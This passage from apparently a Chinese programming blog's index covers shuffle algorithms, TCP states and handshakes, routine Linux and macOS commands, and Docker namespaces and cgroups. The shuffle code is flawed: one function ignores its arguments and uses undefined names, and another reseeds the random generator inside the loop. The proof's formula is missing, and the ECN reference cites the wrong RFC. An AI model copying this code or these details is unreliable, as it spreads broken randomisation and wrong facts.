        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三种洗牌算法shuffle</title>
      <link href="/2018/08/10/shuffle/"/>
      <url>/2018/08/10/shuffle/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>洗牌算法可以被理解为三种洗牌算法，分别是抽牌（Fisher-Yates Shuffle算法），换牌（Knuth-Durstenfeld Shhuffle算法）和插牌算法。</p><h2 id="二、具体算法"><a href="#二、具体算法" class="headerlink" title="二、具体算法"></a>二、具体算法</h2><h3 id="2-1、Fisher-Yates-洗牌算法（抽牌算法）"><a href="#2-1、Fisher-Yates-洗牌算法（抽牌算法）" class="headerlink" title="2.1、Fisher-Yates 洗牌算法（抽牌算法）"></a>2.1、Fisher-Yates 洗牌算法（抽牌算法）</h3><p>这个洗牌方法最早由<code>Ronald A. Fisher</code>和<code>Frank Yates</code>提出，即 <code>Fisher–Yates Shuffle</code>，其基本思想就是从原始数组中随机取一个之前没取过的数字到新的数组中，具体如下：</p><ul><li>初始化原始数组和新数组，原始数组长度为n(已知)；</li><li>从还没处理的数组（假如还剩k个）中，随机产生一个[0, k)之间的数组下标数字p；</li><li>从剩下的k个数中把下标为p的数取出，放在新数组的末尾（末尾有数字则放在末尾前一位，依次往前）；</li><li>重复步骤2和3直到数字全部取完，新数组的数字序列就是一个随机的序列；</li></ul><p> 下面证明其随机性，即每个元素被放置在新数组中的第i个位置是1&#x2F;n（假设数组大小是n）：</p><p>**证明：**一个元素m被放入第i个位置的概率P &#x3D; 前i-1个位置选择元素时没有选中m的概率 * 第i个位置选中m的概率，即：</p><ul><li><p>时间复杂度：$O(n^2)$</p></li><li><p>空间复杂度：$O(n)$</p></li></ul><p>算法实现：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">suffleFisherYates</span><span class="hljs-params">(<span class="hljs-type">char</span> *source, <span class="hljs-type">char</span> *dest)</span> &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;POKER_NUM;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> index=rand()%(POKER_NUM-i)+i;         <span class="hljs-comment">//获取从i~POKER_NUM的一个索引</span><br>        <span class="hljs-built_in">std</span>::swap(poker[i],poker[index]);        <span class="hljs-comment">//交换</span><br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">suffleFisherYates</span><span class="hljs-params">(<span class="hljs-type">char</span> *date, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-type">char</span> t;    <span class="hljs-comment">//t为交换字符空间   </span><br>    <span class="hljs-type">int</span> i, j;<br>    <span class="hljs-keyword">while</span>(--length)&#123;<br>        srand(time(<span class="hljs-number">0</span>));<br>        i = rand()%(length+<span class="hljs-number">1</span>);<br>        t = date[i];<br>        date[i] = date[length];<br>        date[length] = t;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">MySwap</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;x, <span class="hljs-type">int</span> &amp;y)</span><br>&#123;<br>    <span class="hljs-type">int</span> temp = x;<br>    x = y;<br>    y = temp;<br>&#125;<br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">Shuffle</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=n<span class="hljs-number">-1</span>; i&gt;=<span class="hljs-number">1</span>; i--)<br>    &#123;<br>        MySwap(num[i], num[rand()%(i+<span class="hljs-number">1</span>)]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2、Knuth-Durstenfeld-洗牌算法（换牌算法）"><a href="#2-2、Knuth-Durstenfeld-洗牌算法（换牌算法）" class="headerlink" title="2.2、Knuth-Durstenfeld 洗牌算法（换牌算法）"></a>2.2、Knuth-Durstenfeld 洗牌算法（换牌算法）</h3><p>Knuth 和 Durstenfeld  在Fisher等人研究的基础上对算法进行了改进，在原始数组上对数字进行交互，省去了额外O(n)的空间。该算法的基本思想和 Fisher 类似，每次从未处理的数据中随机取出一个数字，然后把该数字放在数组的尾部，即数组尾部存放的是已经处理过的数字。</p><h4 id="2-2-1、算法思路"><a href="#2-2-1、算法思路" class="headerlink" title="2.2.1、算法思路"></a>2.2.1、算法思路</h4><ul><li>建立一个数组大小为n的数组，存放n个数值；</li><li>生成一个从0到m-1（假设数组未处理的大小为m）的数组下标随机数p；</li><li>获取数组中下标为p的数字，并将其与数组下标为m-1的元素互换，数组未处理的大小m减去1；</li><li>依次执行2，3步骤，最终原始数组变成了一个新的随机序列数组；</li></ul><h4 id="2-2-2、算法优缺点"><a href="#2-2-2、算法优缺点" class="headerlink" title="2.2.2、算法优缺点"></a>2.2.2、算法优缺点</h4><ul><li><p>优点：</p><ul><li>不需要额外占用多余的数组空间；</li></ul></li><li><p>缺点：</p><ul><li>必须知道数组的的长度，无法处理长度不固定的数组；</li><li>改变了原数组的排列顺序；</li><li>由于扫描的方式为从后往前，因此无法处理长度动态增长的数组；</li></ul></li></ul><h4 id="2-2-3、算法复杂度"><a href="#2-2-3、算法复杂度" class="headerlink" title="2.2.3、算法复杂度"></a>2.2.3、算法复杂度</h4><ul><li><p>时间复杂度：$O(n)$</p></li><li><p>空间复杂度：$O(1)$</p></li></ul><p>算法实现：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">int</span> *<span class="hljs-title function_">shuffleKnuthDurstenfeld</span><span class="hljs-params">(<span class="hljs-type">int</span> *arr, <span class="hljs-type">int</span> len)</span> &#123;<br>  <span class="hljs-type">int</span> i, p, tmp = <span class="hljs-number">0</span>;<br><br>  srand((<span class="hljs-type">unsigned</span>)time(<span class="hljs-literal">NULL</span>));<br>  <span class="hljs-keyword">for</span>(i = len<span class="hljs-number">-1</span>; i&gt;=<span class="hljs-number">1</span>; i--) &#123;<br>    p = rand()%(i+<span class="hljs-number">1</span>);<br>    tmp = arr[i];<br>    arr[i] = arr[p];<br>    arr[p] = tmp;<br>  &#125;<br>  <span class="hljs-keyword">return</span> arr;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-4、Inside-Out-Algorithm算法"><a href="#2-4、Inside-Out-Algorithm算法" class="headerlink" title="2.4、Inside-Out Algorithm算法"></a>2.4、Inside-Out Algorithm算法</h3><p>Knuth-Durstenfeld Shuffle 是一个内部打乱的算法，算法完成后原始数据被直接打乱，尽管这个方法可以节省空间，但在有些应用中可能需要保留原始数据，所以需要另外开辟一个数组来存储生成的新序列。<br>        Inside-Out Algorithm 算法的基本思思是从前向后扫描数据，把位置i的数据随机插入到前i个（包括第i个）位置中（假设为k），这个操作是在新数组中进行，然后把原始数据中位置k的数字替换新数组位置i的数字。其实效果相当于新数组中位置k和位置i的数字进行交互。</p><p>如果知道arr的lengh的话，可以改为for循环，由于是从前往后遍历，所以可以应对arr[]数目未知的情况，或者arr[]是一个动态增加的情况。<br>证明如下：<br>原数组的第 i 个元素（随机到的数）在新数组的前 i 个位置的概率都是：(1&#x2F;i) * [i&#x2F;(i+1)] * [(i+1)&#x2F;(i+2)] <em>…</em> [(n-1)&#x2F;n] &#x3D; 1&#x2F;n，（即第i次刚好随机放到了该位置，在后面的n-i 次选择中该数字不被选中）。<br>原数组的第 i 个元素（随机到的数）在新数组的 i+1 （包括i + 1）以后的位置（假设是第k个位置）的概率是：(1&#x2F;k) * [k&#x2F;(k+1)] * [(k+1)&#x2F;(k+2)] <em>…</em> [(n-1)&#x2F;n] &#x3D; 1&#x2F;n（即第k次刚好随机放到了该位置，在后面的n-k次选择中该数字不被选中）</p><ul><li><p>时间复杂度：$O(n)$</p></li><li><p>空间复杂度：$O(n)$</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP状态转换详解</title>
      <link href="/2018/05/20/tcp-state-transition/"/>
      <url>/2018/05/20/tcp-state-transition/</url>
      
        <content type="html"><![CDATA[<h2 id="一、TCP的状态转换图示"><a href="#一、TCP的状态转换图示" class="headerlink" title="一、TCP的状态转换图示"></a>一、TCP的状态转换图示</h2><p><img src="/assets/images/tcp-state-transition.png" alt="状态转换图解" loading="lazy"></p><h3 id="1-1、TCP标志位"><a href="#1-1、TCP标志位" class="headerlink" title="1.1、TCP标志位"></a>1.1、TCP标志位</h3><ul><li><code>CWR(Congestion Window Reduce)</code>：拥塞窗口减少标志，由发送端设置，用来表明发送端接收到了设置<code>ECE</code>标志的TCP包，发送端通过降低发送窗口的大小来降低发送速率；</li><li><code>ECE(ECN Echo)</code>：ECN响应标志，在TCP的3次握手时表明一个TCP端是具备<a href="https://zh.wikipedia.org/wiki/%E6%98%BE%E5%BC%8F%E6%8B%A5%E5%A1%9E%E9%80%9A%E7%9F%A5">ECN(Explicit Congestion Notification)</a>功能的，并且表明接收到的TCP包的IP头部的ECN被设置为11，更多信息请参考<a href="https://tools.ietf.org/html/rfc793">RFC793</a>；</li><li><code>URG(Urgent)</code>：表示紧急标志(The Urgent Pointer)有效，目前已经很少使用；</li><li><code>ACK(Acknowledgment)</code>：取值为<code>1</code>时表示确认号有效，这是一个确认的TCP包，取值为<code>0</code>则不是确认包；</li><li><code>PSH(Push)</code>：该标志置位时，一般表示发送端缓存中已经没有待发送的数据，接收端不将该数据进行队列处理，而是尽可能快将数据转由应用处理，在处理<code>Telnet</code>或<code>Rlogin</code>等交互模式的连接时，该标志总是被置位的；</li><li><code>RST(Reset)</code>：用于复位相应的TCP连接，通常在发生异常或者错误的时候会触发复位TCP连接；</li><li><code>SYN(Synchronize)</code>：同步序列编号(Synchronize Sequence Numbers)有效，该标志仅在三次握手建立TCP连接时有效，它提示TCP连接的服务端检查序列编号，该序列编号为TCP连接初始端(一般是客户端)的初始序列编号；</li><li><code>FIN(Finish)</code>：带有该标志置位的数据包用来结束一个TCP会话，用来释放连接，表明发送方已经没有数据发送了；</li></ul><h3 id="1-2、TCP的状态含义"><a href="#1-2、TCP的状态含义" class="headerlink" title="1.2、TCP的状态含义"></a>1.2、TCP的状态含义</h3><ul><li><code>CLOSED</code>：虚拟的起始点，在连接超时或者关闭时候进入此状态，这并不是一个真正的状态，而是一个假想的起点和终点；</li><li><code>LISTEN</code>：表示服务器端的某个 SOCKET 处于监听状态，可以接受客户端的连接；</li><li><code>SYN_SENT</code>：表示客户端已经发送了<code>SYN</code>报文。当客户端 SOCKET 执行 <code>connect()</code> 进行连接时，它首先发送 <code>SYN</code> 报文，然后随即进入到 <code>SYN_SENT</code> 状态，该状态</li><li><code>SYN_RCVD</code>：表示服务器已经接收到了 <code>SYN</code> 报文，并且已经向客户端发送了<code>SYN</code>和<code>ACK</code>报文。在正常情况下，这是服务器端的一个短暂的中间状态，基本上用 <code>netstat</code> 很难看到这种状态。当 TCP 连接处于此状态时，再收到客户端的<code>ACK</code> 报文，它就会进入到 <code>ESTABLISHED</code> 状态；</li><li><code>ESTABLISHED</code>：表示 TCP 连接已经成功建立，数据可以进行传输；</li><li><code>FIN_WAIT_1</code>：表示主动关闭连接的一方已经向对方发送了<code>FIN</code>报文；</li><li><code>FIN_WAIT_2</code>：表示主动关闭连接的一方已经收到了对方发送的<code>ACK</code>报文。该状态有时可以用 netstat 看到；</li><li><code>CLOSE_WAIT</code>：表示被动关闭连接的一方已经收到了对方发送的<code>FIN</code>报文，并且自己已经发送了一个<code>ACK</code>报文给对方。接下来需要检查自己是否还有数据要发送给对方，如果没有的话就可以执行 <code>close()</code> 关闭这个 SOCKET 并发送 <code>FIN</code> 报文给对方，即关闭自己到对方这个方向的连接。有数据的话依据具体的策略（继续发送或者丢弃）去执行；</li><li><code>CLOSING</code>：表示主动关闭连接的一方收到了对方发送的<code>FIN</code>报文，并没有收到对方的<code>ACK</code>报文，表示双方都正在关闭 SOCKET 连接。这种状态比较少见，但当双方几乎在同时 <code>close()</code> 一个 SOCKET 的话，就出现了双方同时发送 <code>FIN</code> 报文的情况，这时就会出现 <code>CLOSING</code> 状态；</li><li><code>LAST_ACK</code>：表示被动关闭连接的一方已经发送了<code>FIN</code>报文，正在等待对方的<code>ACK</code>报文；</li><li><code>TIME_WAIT</code>：表示主动关闭的一方已经收到了对方的<code>FIN</code>报文，并且也已经发送出了<code>ACK</code>报文。<code>TIME_WAIT </code>状态下的 TCP 连接会等待 <code>2*MSL</code>（<code>Max Segment Lifetime</code>，最大分段生存期，指一个 TCP 报文在 Internet 上的最长生存时间。每个具体的 TCP 协议实现都必须选择一个确定的 <code>MSL</code> 值，<code>RFC 1122</code> 建议是 <code>2 分钟</code>，但 <code>BSD</code> 传统实现采用了 <code>30 秒</code>，Linux 可以 <code>cat /proc/sys/net/ipv4/tcp_fin_timeout</code> 看到本机的这个值）;</li></ul><h2 id="二、TCP的握手与挥手"><a href="#二、TCP的握手与挥手" class="headerlink" title="二、TCP的握手与挥手"></a>二、TCP的握手与挥手</h2><p><img src="/assets/images/tcp-communication.png" alt="TCP通信过程" loading="lazy"></p><h3 id="2-1、三次握手"><a href="#2-1、三次握手" class="headerlink" title="2.1、三次握手"></a>2.1、三次握手</h3><ul><li><code>Client</code>和<code>Server</code>的初始状态都是关闭状态，<code>Server</code>进入<code>LISTEN</code>状态后被动等待连接的建立；</li><li><code>Client</code>主动建立连接，向<code>Server</code>发送TCP建连的报文，在报文中标志位<code>SYN被置为1</code>，将序列号<code>seq被设置为x</code>(传送报文时的第一个字节序号为x)，由于<code>SYN</code>标记在逻辑上占用一个序列号，因此实际数据传输的时候，TCP传输的数据中第一个byte对应的系列号为<code>x+1</code>，这个<code>SYN</code>包发送以后，<code>Client</code>进入<code>SYN_SENT</code>状态，等待<code>Server</code>回复ACK确认包；</li><li><code>Server</code>在收到连接请求报文之后，发送确认报文。在确认报文中标志位<code>SYN被置为1</code>，<code>ACK被置为1</code>，同时确认号<code>ack = x + 1</code>，并设置<code>seq = y</code>，发送完此确认包之后，<code>Server</code>进入<code>SYN_RCVD</code>状态；</li><li><code>Client</code>收到确认报文后，回复确认收到数据包，数据包中标志位<code>ACK被置为1</code>，确认号<code>ack = y + 1</code>，然后<code>Client</code>进入<code>ESTABLISHED</code>，<code>Client</code>的TCP通知上层应用进程，连接已经建立成功；</li><li><code>Server</code>收到<code>Client</code>的回复确认数据包后，<code>Server</code>也进入<code>ESTABLISHED</code>状态，同时通知其上层应用进程当前TCP连接已经建立；</li></ul><h3 id="2-2、四次挥手"><a href="#2-2、四次挥手" class="headerlink" title="2.2、四次挥手"></a>2.2、四次挥手</h3><p>在B接收到A的确认包后，B立即进入关闭状态。A和B都进入关闭状态后整个TCP连接释放。</p><ul><li>初始状态下<code>Client</code>和<code>Server</code>都是处于<code>ESTABLISHED</code>状态；</li><li>当应用层没有带发送的数据并且要<code>Client</code>关闭TCP连接的时候，A在要释放连接的报文中将标志位<code>FIN设置为1</code>，<code>ACK设置为1</code>，将序列号<code>seq设置为u</code>，确认号<code>ack设置为v</code>，然后<code>Client</code>进入<code>FIN_WAIT_1</code>状态等待<code>Server</code>的确认；</li><li><code>Server</code>收到<code>Client</code>的<code>FIN包</code>之后，发送确认包（由于<code>FIN包</code>与<code>SYN包</code>都在逻辑上占<code>1byte</code>，因此确认号<code>ack = u + 1</code>，而这个报文段自己的序号为<code>seq = v</code>），然后<code>Server</code>进入<code>CLOSE_WAIT</code>状态，TCP服务器进程通知应用层进程；</li><li><code>Client</code>收到<code>Server</code>的确认包之后，<code>Client</code>进入<code>FIN_WAIT_2</code>状态；</li><li>如果<code>Server</code>已经没有要向<code>Client</code>发送的数据，上层应用进程就通知TCP释放连接，<code>Server</code>就会发送释放连接的数据包（标志位<code>FIN被置为1</code>，<code>ACK被置为1</code>，序列号<code>seq = v</code>，确认号<code>ack = u + 1</code>），然后<code>Server</code>进入<code>LAST_ACK</code>状态；</li><li>当<code>Client</code>收到释放连接的数据包后，必须要发送确认数据包，在确认报文中将标志位<code>ACK置为1</code>，确认号<code>ack = v + 1</code>，序列号<code>seq = u + 1</code>，然后<code>Client</code>进入<code>TIME_WAIT</code>状态，在<code>TIME_WAIT</code>状态下，<code>Client</code>经过<code>2MSL</code>的事件后就会进入<code>CLOSED</code>状态；</li><li>当<code>Server</code>收到<code>Client</code>的确认包之后，<code>Server</code>立刻进入<code>CLOSED</code>状态，当<code>Client</code>和<code>Server</code>都进入<code>CLOSED</code>状态后，整个TCP连接将被释放；</li></ul><h3 id="三、一些问题"><a href="#三、一些问题" class="headerlink" title="三、一些问题"></a>三、一些问题</h3><h3 id="3-1、为什么建立连接协议是三次握手，而关闭连接却是四次握手呢？"><a href="#3-1、为什么建立连接协议是三次握手，而关闭连接却是四次握手呢？" class="headerlink" title="3.1、为什么建立连接协议是三次握手，而关闭连接却是四次握手呢？"></a>3.1、为什么建立连接协议是三次握手，而关闭连接却是四次握手呢？</h3><p>服务端的 LISTEN 状态下的 SOCKET 当收到 SYN 报文的连接请求后，它可以把 ACK 和 SYN（ACK 起应答作用，而 SYN 起同步作用）放在一个报文里来发送。但关闭连接时，当收到对方的 FIN 报文通知时，它仅仅表示对方没有数据发送给你了；但未必你所有的数据都全部发送给对方了，所以你可以未必会马上会关闭 SOCKET，也即你可能还需要发送一些数据给对方之后，再发送 FIN 报文给对方来表示你同意现在可以关闭连接了，所以它这里的 ACK 报文和 FIN 报文多数情况下都是分开发送的。</p><h3 id="3-2、为什么-TIME-WAIT-状态还需要等-2MSL-后才能返回到-CLOSED-状态？"><a href="#3-2、为什么-TIME-WAIT-状态还需要等-2MSL-后才能返回到-CLOSED-状态？" class="headerlink" title="3.2、为什么 TIME_WAIT 状态还需要等 2MSL 后才能返回到 CLOSED 状态？"></a>3.2、为什么 TIME_WAIT 状态还需要等 2MSL 后才能返回到 CLOSED 状态？</h3><ul><li><p>**可靠的实现 TCP 全双工连接的终止：**TCP 协议在关闭连接的四次握手过程中，最终的 ACK 是由主动关闭连接的一端（后面统称 A 端）发出的，如果这个<code> ACK</code> 丢失，对方（后面统称 B 端）将重发出最终的 <code>FIN</code>，因此 A 端必须维护状态信息（TIME_WAIT）允许它重发最终的 <code>ACK</code>。如果 A 端不维持 <code>TIME_WAIT </code>状态，而是处于 <code>CLOSED </code>状态，那么 A 端将响应 <code>RST</code> 分节，B 端收到后将此分节解释成一个错误。因而，要实现 TCP 全双工连接的正常终止，必须处理终止过程中四个分节任何一个分节的丢失情况，主动关闭连接的 A 端必须维持 <code>TIME_WAIT</code> 状态 。</p></li><li><p>**允许老的重复分节在网络中消逝（<code>避免同一端口对应多个套接字</code>）：**TCP 分节可能由于路由器异常而迷途，在迷途期间，TCP 发送端可能因确认超时而重发这个分节，迷途的分节在路由器修复后也会被送到最终目的地，这个迟到的迷途分节到达时可能会引起问题。在关闭前一个连接之后，马上又重新建立起一个相同的 IP 和端口之间的新连接，前一个连接的迷途重复分组在前一个连接终止后到达，而被新连接收到了。为了避免这个情况，TCP 协议不允许处于 <code>TIME_WAIT</code> 状态的连接启动一个新的可用连接，因为 <code>TIME_WAIT</code> 状态持续 <code>2MSL</code>，就可以保证当成功建立一个新 TCP 连接的时候，来自旧连接重复分组已经在网络中消逝；</p></li></ul><h3 id="3-3、关闭-TCP-连接一定需要四次挥手吗？"><a href="#3-3、关闭-TCP-连接一定需要四次挥手吗？" class="headerlink" title="3.3、关闭 TCP 连接一定需要四次挥手吗？"></a>3.3、关闭 TCP 连接一定需要四次挥手吗？</h3><p>不一定，四次挥手关闭 TCP 连接是最安全的做法。但在有些时候，我们不喜欢 <code>TIME_WAIT</code> 状态（如当 <code>MSL</code> 数值设置过大导致服务器端有太多<code> TIME_WAIT</code> 状态的 TCP 连接，减少这些条目数可以更快地关闭连接，为新连接释放更多资源），这时我们可以通过设置 SOCKET 变量的 <code>SO_LINGER</code> 标志来避免 SOCKET 在 close() 之后进入 <code>TIME_WAIT</code> 状态，这时将通过发送 <code>RST</code> 强制终止 <code>TCP</code> 连接（取代正常的 TCP 四次握手的终止方式）；</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> TCP/IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下的常用指令</title>
      <link href="/2018/01/01/commands-linux/"/>
      <url>/2018/01/01/commands-linux/</url>
      
        <content type="html"><![CDATA[<p>记录了一些 Linux 下的常用的指令组合方式，比如查看 CPU 数量，查看指定进程的线程情况，释放页面缓存，关闭透明大页，Docker 相关命令等。</p><h3 id="CPU相关"><a href="#CPU相关" class="headerlink" title="CPU相关"></a>CPU相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看CPU物理核心</span><br><span class="hljs-built_in">cat</span> /proc/cpuinfo | grep <span class="hljs-string">&#x27;physical id&#x27;</span> | <span class="hljs-built_in">sort</span> -u | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment"># 查看CPU核心总数</span><br><span class="hljs-built_in">cat</span> /proc/cpuinfo | grep <span class="hljs-string">&#x27;cpu cores&#x27;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment"># 查看逻辑CPU</span><br><span class="hljs-built_in">cat</span> /proc/cpuinfo | grep <span class="hljs-string">&#x27;processor&#x27;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment"># 查看指定进程的线程情况</span><br>ps -mp 8463 -o THREAD,tid,<span class="hljs-keyword">time</span><br><span class="hljs-comment"># 查看进程的线程CPU占用</span><br>top -H -p 32286<br></code></pre></td></tr></table></figure><h3 id="内存相关"><a href="#内存相关" class="headerlink" title="内存相关"></a>内存相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 释放页面缓存</span><br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/vm/drop_caches<br><span class="hljs-comment"># 释放目录缓存、文件缓存</span><br><span class="hljs-built_in">echo</span> 2 &gt; /proc/sys/vm/drop_caches<br><span class="hljs-comment"># 释放页面缓存、目录缓存、文件缓存</span><br><span class="hljs-built_in">echo</span> 3 &gt; /proc/sys/vm/drop_caches<br><br><span class="hljs-comment"># 查看是否开启内存大页</span><br><span class="hljs-built_in">cat</span> /proc/meminfo | grep <span class="hljs-string">&#x27;Huge&#x27;</span><br><br><span class="hljs-comment"># 关闭透明大页</span><br><span class="hljs-built_in">echo</span> never &gt; /sys/kernel/mm/transparent_hugepage/enabled<br><span class="hljs-built_in">echo</span> never &gt; /sys/kernel/mm/transparent_hugepage/defrag<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag&#x27;</span> &gt;&gt; /etc/rc.d/rc.local<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled&#x27;</span> &gt;&gt; /etc/rc.d/rc.local<br></code></pre></td></tr></table></figure><h3 id="Docker相关"><a href="#Docker相关" class="headerlink" title="Docker相关"></a>Docker相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 清理无用的容器</span><br>docker system prune<br></code></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> 常用命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MacOS下的常用指令</title>
      <link href="/2018/01/01/commands-mac/"/>
      <url>/2018/01/01/commands-mac/</url>
      
        <content type="html"><![CDATA[<p>记录了一些 MacOS 下的常用的指令组合方式，比如重置 Launchpad 等。</p><h3 id="系统操作相关"><a href="#系统操作相关" class="headerlink" title="系统操作相关"></a>系统操作相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 重置 Launchpad</span><br><span class="hljs-built_in">cd</span> ~/Library/Application\ Support/Dock/<br><span class="hljs-built_in">rm</span> ~/Library/Application\ Support/Dock/*.db &amp;&amp; killall Dock<br>defaults write com.apple.dock ResetLaunchPad -bool <span class="hljs-literal">true</span> &amp;&amp; killall Dock<br></code></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> 常用命令 </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker学习笔记 - Docker底层设计</title>
      <link href="/2017/10/15/docker-3/"/>
      <url>/2017/10/15/docker-3/</url>
      
        <content type="html"><![CDATA[<p>传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便，本文列出了 Docker 和传统虚拟化方式的不同的设计。</p><h2 id="一、基本架构"><a href="#一、基本架构" class="headerlink" title="一、基本架构"></a>一、基本架构</h2><p><img src="/assets/images/v-1.png" alt="传统虚拟化" loading="lazy"></p><p><img src="/assets/images/v-2.png" alt="Docker" loading="lazy"></p><p>Docker 采用了 <code>C/S</code> 架构，包括客户端和服务端。Docker 守护进程 （<code>Daemon</code>）作为服务端接受来自客户端的请求，并处理这些请求（创建、运行、分发容器）。</p><p>客户端和服务端既可以运行在一个机器上，也可通过 <code>socket</code> 或者 <code>RESTful API</code> 来进行通信。</p><p>Docker 守护进程一般在宿主主机后台运行，等待接收来自客户端的消息。</p><p>Docker 客户端则为用户提供一系列可执行命令，用户用这些命令实现跟 Docker 守护进程交互。</p><p><img src="/assets/images/docker-basic.png" alt="Docker 基本架构" loading="lazy"></p><h2 id="二、命名空间"><a href="#二、命名空间" class="headerlink" title="二、命名空间"></a>二、命名空间</h2><p>命名空间是 Linux 内核一个强大的特性。每个容器都有自己单独的命名空间，运行在其中的应用都像是在独立的操作系统中运行一样。命名空间保证了容器之间彼此互不影响。</p><h3 id="2-1、pid-命名空间"><a href="#2-1、pid-命名空间" class="headerlink" title="2.1、pid 命名空间"></a>2.1、pid 命名空间</h3><p>不同用户的进程就是通过 pid 命名空间隔离开的，且不同命名空间中可以有相同 pid。所有的 LXC 进程在 Docker 中的父进程为Docker进程，每个 LXC 进程具有不同的命名空间。同时由于允许嵌套，因此可以很方便的实现嵌套的 Docker 容器。</p><h3 id="2-2、net-命名空间"><a href="#2-2、net-命名空间" class="headerlink" title="2.2、net 命名空间"></a>2.2、net 命名空间</h3><p>有了 pid 命名空间, 每个命名空间中的 pid 能够相互隔离，但是网络端口还是共享 host 的端口。网络隔离是通过 net 命名空间实现的， 每个 net 命名空间有独立的 网络设备, IP 地址, 路由表, &#x2F;proc&#x2F;net 目录。这样每个容器的网络就能隔离开来。Docker 默认采用 veth 的方式，将容器中的虚拟网卡同 host 上的一 个Docker 网桥 docker0 连接在一起。</p><h3 id="2-3、ipc-命名空间"><a href="#2-3、ipc-命名空间" class="headerlink" title="2.3、ipc 命名空间"></a>2.3、ipc 命名空间</h3><p>容器中进程交互还是采用了 Linux 常见的进程间交互方法(interprocess communication - IPC), 包括信号量、消息队列和共享内存等。然而同 VM 不同的是，容器的进程间交互实际上还是 host 上具有相同 pid 命名空间中的进程间交互，因此需要在 IPC 资源申请时加入命名空间信息，每个 IPC 资源有一个唯一的 32 位 id。</p><h3 id="2-4、mnt-命名空间"><a href="#2-4、mnt-命名空间" class="headerlink" title="2.4、mnt 命名空间"></a>2.4、mnt 命名空间</h3><p>类似 chroot，将一个进程放到一个特定的目录执行。mnt 命名空间允许不同命名空间的进程看到的文件结构不同，这样每个命名空间 中的进程所看到的文件目录就被隔离开了。同 chroot 不同，每个命名空间中的容器在 &#x2F;proc&#x2F;mounts 的信息只包含所在命名空间的 mount point。</p><h3 id="2-5、uts-命名空间"><a href="#2-5、uts-命名空间" class="headerlink" title="2.5、uts 命名空间"></a>2.5、uts 命名空间</h3><p>UTS(“UNIX Time-sharing System”) 命名空间允许每个容器拥有独立的 hostname 和 domain name, 使其在网络上可以被视作一个独立的节点而非 主机上的一个进程。</p><h3 id="2-6、user-命名空间"><a href="#2-6、user-命名空间" class="headerlink" title="2.6、user 命名空间"></a>2.6、user 命名空间</h3><p>每个容器可以有不同的用户和组 id, 也就是说可以在容器内用容器内部的用户执行程序而非主机上的用户。</p><h2 id="三、控制组"><a href="#三、控制组" class="headerlink" title="三、控制组"></a>三、控制组</h2><p>控制组（<a href="http://en.wikipedia.org/wiki/Cgroups">cgroups</a>）是 Linux 内核的一个特性，主要用来对共享资源进行隔离、限制、审计等。只有能控制分配到容器的资源，才能避免当多个容器同时运行时的对系统资源的竞争。</p><p>控制组技术最早是由 Google 的程序员在 2006 年提出，Linux 内核自 2.6.24 开始支持。</p><p>控制组可以提供对容器的内存、CPU、磁盘 IO 等资源的限制和审计管理。</p><h2 id="四、联合文件系统"><a href="#四、联合文件系统" class="headerlink" title="四、联合文件系统"></a>四、联合文件系统</h2><p>联合文件系统（<a href="http://en.wikipedia.org/wiki/UnionFS">UnionFS</a>）是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下(unite several directories into a single virtual filesystem)。</p><p>联合文件系统是 Docker 镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。</p><p>另外，不同 Docker 